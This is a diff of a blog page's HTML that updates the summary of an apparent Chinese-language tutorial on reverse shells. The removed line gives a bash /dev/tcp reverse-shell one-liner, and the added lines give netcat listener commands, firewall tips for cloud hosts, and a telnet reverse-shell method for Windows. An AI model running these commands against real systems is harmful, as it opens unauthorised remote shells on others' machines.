@@ -1125,9 +1125,11 @@ xml文
                     <div class="card-content article-content">
                         <div class="summary block-with-text">
                             
-                                反弹shell使用bash bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;9999 &lt;&amp;1 
-但是很多时候都是不成功的
-使用shell执行脚本有两种方式，分别是bash x
+                                反弹shell监听端口一般使用nc -lvvp 12345
+阿里云和腾讯云建议使用 nc -lvvnp 12345
+宝塔防火墙或者小皮防火墙要设置它们的防火墙
+Windows反弹shell使用telnet ip port
+使用bashbas
                             
                         </div>
                         <div class="publish-info">
